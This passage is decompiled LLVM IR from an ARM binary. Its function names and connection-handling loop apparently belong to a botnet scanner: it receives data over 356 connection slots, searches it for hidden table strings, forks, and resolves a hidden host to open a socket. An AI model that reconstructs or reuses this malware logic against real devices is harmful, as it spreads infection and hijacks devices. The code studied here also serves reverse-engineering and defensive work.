  %v0_f590 = phi i1 [ %v0_f590.pre, %bb413 ], [ false, %.thread300 ]
  %v2_f590 = xor i1 %v1_f590, true
  %v3_f590 = or i1 %v0_f590, %v2_f590
  br i1 %v3_f590, label %bb408, label %dec_label_pc_f594

dec_label_pc_f594:                                ; preds = %bb414
  %v0_f594 = load i32, i32* @r4, align 4
  %v1_f594 = add i32 %v0_f594, 384
  %v2_f594 = inttoptr i32 %v1_f594 to i8*
  %v3_f594 = load i8, i8* %v2_f594, align 1
  %v4_f594 = zext i8 %v3_f594 to i32
  %v1_f598 = add nuw nsw i32 %v4_f594, 1
  %v1_f59c = urem i32 %v1_f598, 256
  store i32 %v1_f59c, i32* %r3.global-to-local, align 4
  %v2_f5a0 = icmp ugt i32 %v1_f59c, 9
  store i1 %v2_f5a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5a0 = icmp eq i32 %v1_f59c, 10
  store i1 %v7_f5a0, i1* %cpsr_z.global-to-local, align 1
  %v1_f5a4 = trunc i32 %v1_f598 to i8
  store i8 %v1_f5a4, i8* %v2_f594, align 1
  %v0_f5a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f5a8, label %.thread76, label %dec_label_pc_f5b8

.thread76:                                        ; preds = %dec_label_pc_f594
  %v1_f5a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_f5a8 = add i32 %v1_f5a8, -10
  store i32 %v2_f5a8, i32* %r3.global-to-local, align 4
  %v2_f5ac = load i32, i32* @r4, align 4
  %v3_f5ac = add i32 %v2_f5ac, 12
  %v4_f5ac = inttoptr i32 %v3_f5ac to i32*
  store i32 %v2_f5a8, i32* %v4_f5ac, align 4
  %v1_f5b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_f5b0 = trunc i32 %v1_f5b0 to i8
  %v3_f5b0 = load i32, i32* @r4, align 4
  %v4_f5b0 = add i32 %v3_f5b0, 384
  %v5_f5b0 = inttoptr i32 %v4_f5b0 to i8*
  store i8 %v2_f5b0, i8* %v5_f5b0, align 1
  %v0_f5b4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f5b4.pr.pr, label %bb408, label %dec_label_pc_f5b8

dec_label_pc_f5b8:                                ; preds = %dec_label_pc_f594, %.thread76
  %v0_f5b8 = load i32, i32* @r4, align 4
  store i32 %v0_f5b8, i32* @r0, align 4
  %v0_f5bc = call i32 @setup_connection()
  br label %bb408

dec_label_pc_f5c4:                                ; preds = %dec_label_pc_f4d4
  %v3_f5c8 = udiv i32 %v3_f5c4, 32
  %v3_f5cc = mul nuw nsw i32 %v3_f5c8, 4
  store i32 %v2_f5d0, i32* @lr, align 4
  %v2_f5d4 = add i32 %v3_f5cc, %v2_f5d0
  store i32 %v2_f5d4, i32* %r3.global-to-local, align 4
  %v1_f5d8 = add i32 %v2_f5d4, -312
  %v2_f5d8 = inttoptr i32 %v1_f5d8 to i32*
  %v3_f5d8 = load i32, i32* %v2_f5d8, align 4
  %v1_f5dc = urem i32 %v3_f5c4, 32
  store i32 %v1_f5dc, i32* %r1.global-to-local, align 4
  %v7_f5e0 = shl i32 1, %v1_f5dc
  %v8_f5e0 = or i32 %v3_f5d8, %v7_f5e0
  store i32 %v8_f5e0, i32* %r2.global-to-local, align 4
  %v0_f5e4 = load i32, i32* @r5, align 4
  %v3_f5e4 = icmp uge i32 %v0_f5e4, %v3_f5c4
  store i1 %v3_f5e4, i1* %cpsr_c.global-to-local, align 1
  %v9_f5e4 = icmp eq i32 %v0_f5e4, %v3_f5c4
  store i1 %v9_f5e4, i1* %cpsr_z.global-to-local, align 1
  %v5_f5e8 = icmp slt i32 %v0_f5e4, %v3_f5c4
  br i1 %v5_f5e8, label %bb415, label %bb416

bb415:                                            ; preds = %dec_label_pc_f5c4
  store i32 %v3_f5c4, i32* @r5, align 4
  br label %bb416

bb416:                                            ; preds = %dec_label_pc_f5c4, %bb415
  store i32 %v8_f5e0, i32* %v2_f5d8, align 4
  br label %bb408

dec_label_pc_f5f4:                                ; preds = %bb408
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_f600 = load i32, i32* @r6, align 4
  %v1_f600 = load i32, i32* @r5, align 4
  %v3_f600 = icmp uge i32 %v0_f600, %v1_f600
  store i1 %v3_f600, i1* %cpsr_c.global-to-local, align 1
  %v9_f600 = icmp eq i32 %v0_f600, %v1_f600
  store i1 %v9_f600, i1* %cpsr_z.global-to-local, align 1
  %v5_f604 = icmp slt i32 %v0_f600, %v1_f600
  %storemerge157 = select i1 %v5_f604, i32 %v1_f600, i32 %v0_f600
  store i32 %v2_f618, i32* %ip.global-to-local, align 4
  store i32 %v2_f61c, i32* %r1.global-to-local, align 4
  store i32 %v2_f620, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f628 = add i32 %storemerge157, 1
  %v5_f634 = call i32 @__libc_select(i32 %v1_f628, i32 %v2_f61c, i32 %v2_f620, i32 0, i32 %v2_f618)
  %v0_f638 = load i32, i32* @r4, align 4
  %v1_f63c = inttoptr i32 %v0_f638 to i32*
  %v2_f63c = call i32 @__GI_time(i32* %v1_f63c)
  store i32 ptrtoint (i32* @global_var_22448.145 to i32), i32* @lr, align 4
  %v0_f644 = load i32, i32* @r4, align 4
  store i32 %v0_f644, i32* %stack_var_-52, align 4
  store i32 %v2_f63c, i32* @global_var_22448.145, align 4
  br label %dec_label_pc_f64c

dec_label_pc_f64c:                                ; preds = %dec_label_pc_f7c0, %dec_label_pc_f5f4
  %v1_f658 = phi i32 [ %v1_f7c4, %dec_label_pc_f7c0 ], [ %v0_f644, %dec_label_pc_f5f4 ]
  store i32 ptrtoint (i32* @global_var_24f2c.156 to i32), i32* %r1.global-to-local, align 4
  %v2_f65c = load i32, i32* @global_var_24f2c.156, align 4
  store i32 %v2_f65c, i32* %r2.global-to-local, align 4
  %v3_f660 = mul i32 %v1_f658, 388
  store i32 %v3_f660, i32* %r3.global-to-local, align 4
  %v2_f664 = add i32 %v2_f65c, %v3_f660
  store i32 %v2_f664, i32* @r6, align 4
  %v1_f668 = add i32 %v2_f664, 4
  %v2_f668 = inttoptr i32 %v1_f668 to i32*
  %v3_f668 = load i32, i32* %v2_f668, align 4
  %v2_f66c = icmp eq i32 %v3_f668, -1
  store i1 %v2_f66c, i1* %cpsr_c.global-to-local, align 1
  %v7_f66c = icmp eq i32 %v3_f668, -1
  store i1 %v7_f66c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f66c, label %dec_label_pc_f7c0, label %dec_label_pc_f674

dec_label_pc_f674:                                ; preds = %dec_label_pc_f64c
  %v3_f674 = udiv i32 %v3_f668, 32
  store i32 %v2_f5d0, i32* %r3.global-to-local, align 4
  %v3_f67c = mul nuw nsw i32 %v3_f674, 4
  store i32 %v3_f67c, i32* @ip, align 4
  %v2_f680 = add i32 %v3_f67c, %v2_f5d0
  store i32 %v2_f680, i32* %r2.global-to-local, align 4
  %v1_f684 = add i32 %v2_f680, -312
  %v2_f684 = inttoptr i32 %v1_f684 to i32*
  %v3_f684 = load i32, i32* %v2_f684, align 4
  %v1_f688 = urem i32 %v3_f668, 32
  store i32 %v1_f688, i32* %r1.global-to-local, align 4
  %v2_f68c = add nsw i32 %v1_f688, -1
  %v3_f68c = shl i32 1, %v2_f68c
  %v4_f68c = and i32 %v3_f684, %v3_f68c
  %v5_f68c = icmp ne i32 %v4_f68c, 0
  store i1 %v5_f68c, i1* %cpsr_c.global-to-local, align 1
  %v6_f68c = ashr i32 %v3_f684, %v1_f688
  store i32 %v6_f68c, i32* %r3.global-to-local, align 4
  %v1_f690 = urem i32 %v6_f68c, 2
  %v2_f690 = icmp eq i32 %v1_f690, 0
  store i1 %v2_f690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f690, label %dec_label_pc_f698, label %dec_label_pc_10208

dec_label_pc_f698:                                ; preds = %dec_label_pc_f674, %dec_label_pc_102ac
  %v1_f6a4 = phi i32 [ %v1_f688, %dec_label_pc_f674 ], [ %v1_f6a4.pre, %dec_label_pc_102ac ]
  %v0_f69c = phi i32 [ %v3_f67c, %dec_label_pc_f674 ], [ %v0_f69c.pre, %dec_label_pc_102ac ]
  store i32 %v2_f5d0, i32* @lr, align 4
  %v2_f69c = add i32 %v0_f69c, %v2_f5d0
  store i32 %v2_f69c, i32* %r2.global-to-local, align 4
  %v1_f6a0 = add i32 %v2_f69c, -184
  %v2_f6a0 = inttoptr i32 %v1_f6a0 to i32*
  %v3_f6a0 = load i32, i32* %v2_f6a0, align 4
  %v2_f6a4 = add i32 %v1_f6a4, -1
  %v3_f6a4 = shl i32 1, %v2_f6a4
  %v4_f6a4 = and i32 %v3_f6a0, %v3_f6a4
  %v5_f6a4 = icmp ne i32 %v4_f6a4, 0
  store i1 %v5_f6a4, i1* %cpsr_c.global-to-local, align 1
  %v6_f6a4 = ashr i32 %v3_f6a0, %v1_f6a4
  store i32 %v6_f6a4, i32* %r3.global-to-local, align 4
  %v1_f6a8 = urem i32 %v6_f6a4, 2
  %v2_f6a8 = icmp eq i32 %v1_f6a8, 0
  store i1 %v2_f6a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6a8, label %dec_label_pc_f7c0, label %dec_label_pc_f6b0.preheader

dec_label_pc_f6b0.preheader:                      ; preds = %dec_label_pc_f698
  %v0_f6b0182 = load i32, i32* @r6, align 4
  %v1_f6b0183 = add i32 %v0_f6b0182, 12
  %v2_f6b0184 = inttoptr i32 %v1_f6b0183 to i32*
  %v3_f6b0185 = load i32, i32* %v2_f6b0184, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6b4181187 = icmp eq i32 %v3_f6b0185, 0
  store i1 %v2_f6b4181187, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6b4181187, label %dec_label_pc_f7c0, label %dec_label_pc_f6bc.lr.ph

dec_label_pc_f6b0.loopexit:                       ; preds = %dec_label_pc_f810, %dec_label_pc_f8fc
  %v0_f6b0 = load i32, i32* @r6, align 4
  %v1_f6b0 = add i32 %v0_f6b0, 12
  %v2_f6b0 = inttoptr i32 %v1_f6b0 to i32*
  %v3_f6b0 = load i32, i32* %v2_f6b0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6b4181 = icmp eq i32 %v3_f6b0, 0
  store i1 %v2_f6b4181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6b4181, label %dec_label_pc_f7c0, label %dec_label_pc_f6bc.lr.ph

dec_label_pc_f6bc.lr.ph:                          ; preds = %dec_label_pc_f6b0.preheader, %dec_label_pc_f6b0.loopexit
  %v0_f6bc231 = phi i32 [ %v0_f6b0, %dec_label_pc_f6b0.loopexit ], [ %v0_f6b0182, %dec_label_pc_f6b0.preheader ]
  br label %dec_label_pc_f6bc

dec_label_pc_f6bc:                                ; preds = %dec_label_pc_f6b4.backedge.thread, %dec_label_pc_f6b4.backedge, %dec_label_pc_f6b4.backedge.thread562, %dec_label_pc_f6bc.lr.ph
  %v0_101d4 = phi i32 [ %v0_f6bc231, %dec_label_pc_f6bc.lr.ph ], [ %v0_f6bc228, %dec_label_pc_f6b4.backedge ], [ %v0_f734, %dec_label_pc_f6b4.backedge.thread ], [ %v0_f734, %dec_label_pc_f6b4.backedge.thread562 ]
  %v1_f6bc = add i32 %v0_101d4, 24
  %v2_f6bc = inttoptr i32 %v1_f6bc to i32*
  %v3_f6bc = load i32, i32* %v2_f6bc, align 4
  store i32 %v3_f6bc, i32* @r3, align 4
  %v2_f6c0 = icmp ugt i32 %v3_f6bc, 355
  store i1 %v2_f6c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f6c0 = icmp eq i32 %v3_f6bc, 356
  store i1 %v7_f6c0, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_101d4, 28
  store i32 %.pre, i32* @fp, align 4
  br i1 %v7_f6c0, label %dec_label_pc_101d4, label %dec_label_pc_f6cc

dec_label_pc_f6cc:                                ; preds = %dec_label_pc_f6bc, %dec_label_pc_101d4
  store i32 %v0_f2d0, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %v2_f2ec, align 4
  %v0_f6d8 = load i32, i32* @r6, align 4
  %v1_f6d8 = add i32 %v0_f6d8, 24
  %v2_f6d8 = inttoptr i32 %v1_f6d8 to i32*
  %v3_f6d8 = load i32, i32* %v2_f6d8, align 4
  store i32 %v3_f6d8, i32* %r2.global-to-local, align 4
  %v0_f6dc = load i32, i32* @fp, align 4
  %v2_f6dc = add i32 %v0_f6dc, %v3_f6d8
  store i32 %v2_f6dc, i32* @r4, align 4
  %v1_f6e0 = add i32 %v0_f6d8, 4
  %v2_f6e0 = inttoptr i32 %v1_f6e0 to i32*
  %v3_f6e0 = load i32, i32* %v2_f6e0, align 4
  %v1_f6e4 = sub i32 356, %v3_f6d8
  store i32 %v1_f6e4, i32* %r2.global-to-local, align 4
  store i32 %v2_f6dc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f6f0 = call i32 @__libc_recv(i32 %v3_f6e0, i32 %v2_f6dc, i32 %v1_f6e4, i32 16384)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6f4 = icmp eq i32 %v4_f6f0, 0
  store i1 %v2_f6f4, i1* %cpsr_z.global-to-local, align 1
  %tmp417 = icmp slt i32 %v4_f6f0, 1
  br i1 %tmp417, label %dec_label_pc_f76c, label %dec_label_pc_f6fc

dec_label_pc_f6fc:                                ; preds = %dec_label_pc_f6cc
  %v0_f6fc = load i32, i32* @r5, align 4
  store i32 %v0_f6fc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f700

dec_label_pc_f700:                                ; preds = %.thread83, %dec_label_pc_f6fc
  %v3_f70c = phi i32 [ %v1_f710, %.thread83 ], [ %v0_f6fc, %dec_label_pc_f6fc ]
  %v1_f700 = load i32, i32* @r4, align 4
  %v2_f700 = add i32 %v1_f700, %v3_f70c
  %v3_f700 = inttoptr i32 %v2_f700 to i8*
  %v4_f700 = load i8, i8* %v3_f700, align 1
  %v6_f700 = zext i8 %v4_f700 to i32
  store i32 %v6_f700, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f704 = icmp eq i8 %v4_f700, 0
  store i1 %v2_f704, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f704, label %bb418, label %.thread83

bb418:                                            ; preds = %dec_label_pc_f700
  %v2_f708 = add nuw nsw i32 %v6_f700, 65
  store i32 %v2_f708, i32* %r3.global-to-local, align 4
  %v2_f70c = trunc i32 %v2_f708 to i8
  store i8 %v2_f70c, i8* %v3_f700, align 1
  %v0_f710.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread83

.thread83:                                        ; preds = %dec_label_pc_f700, %bb418
  %v0_f710 = phi i32 [ %v3_f70c, %dec_label_pc_f700 ], [ %v0_f710.pre, %bb418 ]
  %v1_f710 = add i32 %v0_f710, 1
  store i32 %v1_f710, i32* %r2.global-to-local, align 4
  %v3_f714 = icmp uge i32 %v1_f710, %v4_f6f0
  store i1 %v3_f714, i1* %cpsr_c.global-to-local, align 1
  %v9_f714 = icmp eq i32 %v1_f710, %v4_f6f0
  store i1 %v9_f714, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f714, label %dec_label_pc_f71c, label %dec_label_pc_f700

dec_label_pc_f71c:                                ; preds = %.thread83, %dec_label_pc_f770
  store i32 ptrtoint (i32* @global_var_22448.145 to i32), i32* @lr, align 4
  %v0_f720 = load i32, i32* @r6, align 4
  %v1_f720 = add i32 %v0_f720, 24
  %v2_f720 = inttoptr i32 %v1_f720 to i32*
  %v3_f720 = load i32, i32* %v2_f720, align 4
  %v2_f724 = load i32, i32* @global_var_22448.145, align 4
  store i32 %v2_f724, i32* %r2.global-to-local, align 4
  %v2_f728 = add i32 %v3_f720, %v4_f6f0
  store i32 %v2_f728, i32* %r3.global-to-local, align 4
  store i32 %v2_f728, i32* %v2_f720, align 4
  %v0_f730 = load i32, i32* %r2.global-to-local, align 4
  %v1_f730 = load i32, i32* @r6, align 4
  %v2_f730 = add i32 %v1_f730, 8
  %v3_f730 = inttoptr i32 %v2_f730 to i32*
  store i32 %v0_f730, i32* %v3_f730, align 4
  br label %dec_label_pc_f734

dec_label_pc_f734:                                ; preds = %dec_label_pc_f904, %dec_label_pc_f71c
  %v0_f734 = load i32, i32* @r6, align 4
  %v1_f734 = add i32 %v0_f734, 12
  %v2_f734 = inttoptr i32 %v1_f734 to i32*
  %v3_f734 = load i32, i32* %v2_f734, align 4
  %v1_f738 = add i32 %v3_f734, -2
  store i32 %v1_f738, i32* @r3, align 4
  %v7_f73c = icmp eq i32 %v1_f738, 8
  store i1 %v7_f73c, i1* %cpsr_z.global-to-local, align 1
  %v5_f740 = and i32 %v1_f738, 1073741824
  %v6_f740 = icmp ne i32 %v5_f740, 0
  store i1 %v6_f740, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_f734, label %dec_label_pc_f6b4.backedge [
    i32 2, label %dec_label_pc_fa00
    i32 3, label %dec_label_pc_ff7c
    i32 4, label %dec_label_pc_fdbc
    i32 5, label %dec_label_pc_fba4
    i32 6, label %dec_label_pc_fad0
    i32 7, label %dec_label_pc_fea8
    i32 8, label %dec_label_pc_fc78
    i32 9, label %dec_label_pc_f92c
    i32 10, label %dec_label_pc_f7d8
  ]

dec_label_pc_f76c:                                ; preds = %dec_label_pc_f6cc
  br i1 %v2_f6f4, label %dec_label_pc_10438, label %dec_label_pc_f770

dec_label_pc_f770:                                ; preds = %dec_label_pc_f76c
  %v3_f770 = icmp eq i32 %v4_f6f0, -1
  store i1 %v3_f770, i1* %cpsr_c.global-to-local, align 1
  %v8_f770 = icmp eq i32 %v4_f6f0, -1
  store i1 %v8_f770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f770, label %dec_label_pc_f778, label %dec_label_pc_f71c

dec_label_pc_f778:                                ; preds = %dec_label_pc_f770
  store i32 %v0_f2d0, i32* %ip.global-to-local, align 4
  %v2_f77c = load i32, i32* %v2_f2ec, align 4
  store i32 %v2_f77c, i32* %r3.global-to-local, align 4
  %v2_f780 = icmp ugt i32 %v2_f77c, 10
  store i1 %v2_f780, i1* %cpsr_c.global-to-local, align 1
  %v7_f780 = icmp eq i32 %v2_f77c, 11
  store i1 %v7_f780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f780, label %dec_label_pc_f7c0, label %dec_label_pc_f788

dec_label_pc_f788:                                ; preds = %dec_label_pc_f778, %dec_label_pc_10438
  %v0_f788 = load i32, i32* @r6, align 4
  %v1_f788 = add i32 %v0_f788, 4
  %v2_f788 = inttoptr i32 %v1_f788 to i32*
  %v3_f788 = load i32, i32* %v2_f788, align 4
  %v1_f78c = call i32 @__GI___libc_close(i32 %v3_f788)
  %v0_f790 = load i32, i32* @r6, align 4
  %v1_f790 = add i32 %v0_f790, 384
  %v2_f790 = inttoptr i32 %v1_f790 to i8*
  %v3_f790 = load i8, i8* %v2_f790, align 1
  %v4_f790 = zext i8 %v3_f790 to i32
  %v1_f794 = add nuw nsw i32 %v4_f790, 1
  %v1_f798 = urem i32 %v1_f794, 256
  store i32 %v1_f798, i32* %r3.global-to-local, align 4
  %v2_f79c = icmp ugt i32 %v1_f798, 8
  store i1 %v2_f79c, i1* %cpsr_c.global-to-local, align 1
  %v7_f79c = icmp eq i32 %v1_f798, 9
  store i1 %v7_f79c, i1* %cpsr_z.global-to-local, align 1
  %v1_f7a0 = trunc i32 %v1_f794 to i8
  store i8 %v1_f7a0, i8* %v2_f790, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f7a8 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f7a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f7a8 = xor i1 %v1_f7a8, true
  %v3_f7a8 = and i1 %v0_f7a8, %v2_f7a8
  br i1 %v3_f7a8, label %bb419, label %.thread312

.thread312:                                       ; preds = %dec_label_pc_f788
  %v1_f7ac308313 = load i32, i32* @r6, align 4
  %v2_f7ac309314 = add i32 %v1_f7ac308313, 4
  %v3_f7ac310315 = inttoptr i32 %v2_f7ac309314 to i32*
  store i32 -1, i32* %v3_f7ac310315, align 4
  br label %bb420

bb419:                                            ; preds = %dec_label_pc_f788
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f7ac304 = load i32, i32* @r6, align 4
  %v2_f7ac305 = add i32 %v1_f7ac304, 4
  %v3_f7ac306 = inttoptr i32 %v2_f7ac305 to i32*
  store i32 -1, i32* %v3_f7ac306, align 4
  %v4_f7b0 = load i32, i32* %r3.global-to-local, align 4
  %v5_f7b0 = load i32, i32* @r6, align 4
  %v6_f7b0 = add i32 %v5_f7b0, 12
  %v7_f7b0 = inttoptr i32 %v6_f7b0 to i32*
  store i32 %v4_f7b0, i32* %v7_f7b0, align 4
  %v4_f7b4 = load i32, i32* %r3.global-to-local, align 4
  %v5_f7b4 = trunc i32 %v4_f7b4 to i8
  %v6_f7b4 = load i32, i32* @r6, align 4
  %v7_f7b4 = add i32 %v6_f7b4, 384
  %v8_f7b4 = inttoptr i32 %v7_f7b4 to i8*
  store i8 %v5_f7b4, i8* %v8_f7b4, align 1
  %v0_f7b8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f7b8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb420

bb420:                                            ; preds = %.thread312, %bb419
  %v1_f7bc = phi i1 [ %v1_f7b8.pre, %bb419 ], [ %v0_f7a8, %.thread312 ]
  %v0_f7bc = phi i1 [ %v0_f7b8.pre, %bb419 ], [ %v1_f7a8, %.thread312 ]
  %v2_f7b8 = xor i1 %v1_f7bc, true
  %v3_f7b8 = or i1 %v0_f7bc, %v2_f7b8
  br i1 %v3_f7b8, label %bb421, label %bb422

bb421:                                            ; preds = %bb420
  br label %bb422

bb422:                                            ; preds = %bb420, %bb421
  store i32 63424, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f7b8, i32 ptrtoint (i32* @global_var_eaac.206 to i32))
  br label %dec_label_pc_f7c0

dec_label_pc_f7c0:                                ; preds = %dec_label_pc_f6b0.loopexit, %dec_label_pc_f6b4.backedge, %dec_label_pc_f6b0.preheader, %dec_label_pc_f778, %dec_label_pc_f698, %dec_label_pc_f64c, %dec_label_pc_102cc, %bb422
  %v3_f7c0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f7c0, i32* %r3.global-to-local, align 4
  %v1_f7c4 = add i32 %v3_f7c0, 1
  store i32 %v1_f7c4, i32* @r4, align 4
  %v3_f7c8 = icmp ugt i32 %v1_f7c4, 355
  store i1 %v3_f7c8, i1* %cpsr_c.global-to-local, align 1
  %v8_f7c8 = icmp eq i32 %v1_f7c4, 356
  store i1 %v8_f7c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f7c4, i32* %stack_var_-52, align 4
  %v5_f7d0 = icmp slt i32 %v1_f7c4, 356
  br i1 %v5_f7d0, label %dec_label_pc_f64c, label %dec_label_pc_efbc

dec_label_pc_f7d8:                                ; preds = %dec_label_pc_f734
  %v1_f7dc = call i32 @table_unlock_val(i32 12)
  store i32 %v2_1000c, i32* %r1.global-to-local, align 4
  %v3_f7ec = call i32 @table_retrieve_val(i32 12, i32* nonnull %stack_var_-60)
  %v3_f7f0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f7ec, i32* %r2.global-to-local, align 4
  %v1_f7f8 = add i32 %v3_f7f0, -1
  store i32 %v1_f7f8, i32* %r3.global-to-local, align 4
  %v0_f7fc = load i32, i32* @fp, align 4
  %v0_f800 = load i32, i32* @r6, align 4
  %v1_f800 = add i32 %v0_f800, 24
  %v2_f800 = inttoptr i32 %v1_f800 to i32*
  %v3_f800 = load i32, i32* %v2_f800, align 4
  store i32 %v3_f800, i32* %r1.global-to-local, align 4
  %v4_f804 = call i32 @util_memsearch(i32 %v0_f7fc, i32 %v3_f800, i32 %v3_f7ec, i32 %v1_f7f8)
  %v3_f808 = icmp eq i32 %v4_f804, -1
  store i1 %v3_f808, i1* %cpsr_c.global-to-local, align 1
  %v8_f808 = icmp eq i32 %v4_f804, -1
  store i1 %v8_f808, i1* %cpsr_z.global-to-local, align 1
  %v1_f814 = call i32 @table_lock_val(i32 12)
  br i1 %v3_f808, label %dec_label_pc_f810, label %dec_label_pc_1016c

dec_label_pc_f810:                                ; preds = %dec_label_pc_f7d8
  %v1_f81c = call i32 @table_unlock_val(i32 11)
  store i32 %v2_1000c, i32* %r1.global-to-local, align 4
  %v3_f82c = call i32 @table_retrieve_val(i32 11, i32* nonnull %stack_var_-60)
  %v3_f830 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f82c, i32* %r2.global-to-local, align 4
  %v1_f838 = add i32 %v3_f830, -1
  store i32 %v1_f838, i32* %r3.global-to-local, align 4
  %v0_f83c = load i32, i32* @r6, align 4
  %v1_f83c = add i32 %v0_f83c, 24
  %v2_f83c = inttoptr i32 %v1_f83c to i32*
  %v3_f83c = load i32, i32* %v2_f83c, align 4
  store i32 %v3_f83c, i32* %r1.global-to-local, align 4
  %v0_f840 = load i32, i32* @fp, align 4
  %v4_f844 = call i32 @util_memsearch(i32 %v0_f840, i32 %v3_f83c, i32 %v3_f82c, i32 %v1_f838)
  store i32 %v4_f844, i32* @r7, align 4
  %v1_f850 = call i32 @table_lock_val(i32 11)
  %v0_f854 = load i32, i32* @r7, align 4
  %v2_f854 = icmp eq i32 %v0_f854, -1
  store i1 %v2_f854, i1* %cpsr_c.global-to-local, align 1
  %v7_f854 = icmp eq i32 %v0_f854, -1
  store i1 %v7_f854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f854, label %dec_label_pc_f6b0.loopexit, label %dec_label_pc_f85c

dec_label_pc_f85c:                                ; preds = %dec_label_pc_f810
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f85c = icmp eq i32 %v0_f854, 0
  store i1 %v2_f85c, i1* %cpsr_z.global-to-local, align 1
  %tmp423 = icmp slt i32 %v0_f854, 1
  br i1 %tmp423, label %dec_label_pc_f8fc, label %dec_label_pc_f864

dec_label_pc_f864:                                ; preds = %dec_label_pc_f85c
  %v0_f864 = load i32, i32* @r6, align 4
  %v1_f864 = add i32 %v0_f864, 20
  %v2_f864 = inttoptr i32 %v1_f864 to i16*
  %v3_f864 = load i16, i16* %v2_f864, align 2
  %v4_f864 = zext i16 %v3_f864 to i32
  store i32 %v4_f864, i32* %r3.global-to-local, align 4
  %v1_f868 = add i32 %v0_f864, 16
  %v2_f868 = inttoptr i32 %v1_f868 to i32*
  %v3_f868 = load i32, i32* %v2_f868, align 4
  store i32 %v3_f868, i32* %r2.global-to-local, align 4
  store i32 %v2_f86c, i32* %r1.global-to-local, align 4
  store i32 %v4_f864, i32* %stack_var_-42, align 4
  store i32 %v3_f868, i32* %stack_var_-60, align 4
  %v1_f878 = inttoptr i32 %v0_f864 to i32*
  %v2_f878 = load i32, i32* %v1_f878, align 4
  store i32 %v2_f878, i32* @sb, align 4
  %v0_f87c = call i32 @__libc_fork()
  %v7_f880 = icmp eq i32 %v0_f87c, -1
  %.462 = zext i1 %v7_f880 to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f88c = icmp eq i32 %v0_f87c, 0
  store i1 %v2_f88c, i1* %cpsr_z.global-to-local, align 1
  %tmp426 = icmp slt i32 %v0_f87c, 1
  br i1 %tmp426, label %bb427, label %.thread86

.thread86:                                        ; preds = %dec_label_pc_f864
  store i32 1, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f8e4

bb427:                                            ; preds = %dec_label_pc_f864
  store i32 %.462, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f898 = icmp eq i1 %v7_f880, false
  store i1 %v2_f898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f898, label %dec_label_pc_f8a0, label %dec_label_pc_f8e4

dec_label_pc_f8a0:                                ; preds = %bb427
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f8ac = call i32 @socket(i32 2, i32 1, i32 0)
  %v2_f8b0 = icmp eq i32 %v3_f8ac, -1
  store i1 %v2_f8b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f8b0 = icmp eq i32 %v3_f8ac, -1
  store i1 %v7_f8b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f8ac, i32* @r8, align 4
  br i1 %v7_f8b0, label %dec_label_pc_10408, label %dec_label_pc_f8bc

dec_label_pc_f8bc:                                ; preds = %dec_label_pc_f8a0
  %v1_f8c0 = call i32 @table_unlock_val(i32 3)
  %v1_f8c8 = call i32 @table_unlock_val(i32 4)
  %v0_f8cc = load i32, i32* @sl, align 4
  store i32 %v0_f8cc, i32* %r1.global-to-local, align 4
  %v2_f8d4 = inttoptr i32 %v0_f8cc to i32*
  %v3_f8d4 = call i32 @table_retrieve_val(i32 3, i32* %v2_f8d4)
  %v1_f8d8 = call i32 @resolv_lookup(i32 %v3_f8d4)
  store i32 %v1_f8d8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_f8dc = icmp eq i32 %v1_f8d8, 0
  store i1 %v3_f8dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f8dc, label %dec_label_pc_f8e4, label %dec_label_pc_102e8

